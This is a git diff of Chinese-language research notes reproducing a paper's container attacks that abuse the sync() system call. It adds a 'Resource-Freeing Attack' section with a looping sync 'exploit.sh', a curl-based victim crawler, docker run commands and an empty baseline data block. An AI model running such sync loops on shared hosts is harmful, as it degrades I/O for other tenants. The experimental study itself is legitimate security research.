@@ -481,7 +481,7 @@ if (option && typeof option === "object") {
 
 论文提出 sync 系统调用可以用来降低 system-wide I/O performance，进行 resource-freeing attack 以及建立 convert channel。当然，**只有当前系统当中存在 write 行为的时候**，sync 相关的 attack 才有用武之地。
 
-#### Slow down system-wide I/O performance
+#### I/O Based DOS Attack
 
 这个实验中，依旧是 2 个 containers，一个循环调用 sync() system call。另一个 victim container 中运行 [FIO benchmark](https://github.com/axboe/fio) 来检测 I/O performance，运行 [Unix benchmark](https://github.com/kdlucas/byte-unixbench) 来检测体统性能的变化。
 
@@ -651,6 +651,41 @@ if (option && typeof option === "object") {
     myChart.setOption(option, true);
 }
 </script>
+
+#### Resource-Freeing Attack
+
+victim container - web crawler
+
+```shell
+$ cat apt/web-crawler.sh 
+#!/bin/bash
+while true
+do
+	curl www.baidu.com > out.txt
+done
+$ docker run --cpuset-cpus="0" -v /home/zty/dev/tianyu-ubuntu/apt
+:/cfile -it --rm tianyu/ubuntu:v2.1	# v2.1 installs curl
+```
+
+malicious container - sync shell & sysbench
+
+```shell
+$ cat exploit.sh 
+#!/bin/bash
+while true
+do
+	sync
+done
+$ docker run --cpuset-cpus="0" -v /home/zty/dev/cfile:/cfile -it --rm tianyu/ubuntu:v1 # v1 installs sysbench
+```
+
+baseline data
+
+```
+
+```
+
+
 
 
 
